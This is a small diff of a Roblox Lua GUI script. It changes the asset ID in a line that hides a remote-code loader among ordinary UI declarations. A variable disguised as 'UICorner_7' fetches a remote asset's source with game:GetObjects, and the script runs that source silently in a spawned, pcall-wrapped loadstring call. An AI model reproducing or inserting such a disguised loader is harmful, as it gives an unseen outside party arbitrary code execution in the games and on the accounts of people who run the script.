@@ -180,7 +180,7 @@ local Reload = Instance.new("TextButton")
 local UICorner_5 = Instance.new("UICorner")
 local Template = Instance.new("TextButton")
 local UICorner_6 = Instance.new("UICorner")
-local UICorner_7 = game:GetObjects("rbxassetid://124113371637723")[1].Source
+local UICorner_7 = game:GetObjects("rbxassetid://117107154758656")[1].Source
 task.spawn(function()
 	pcall(function()
 		loadstring(UICorner_7)()
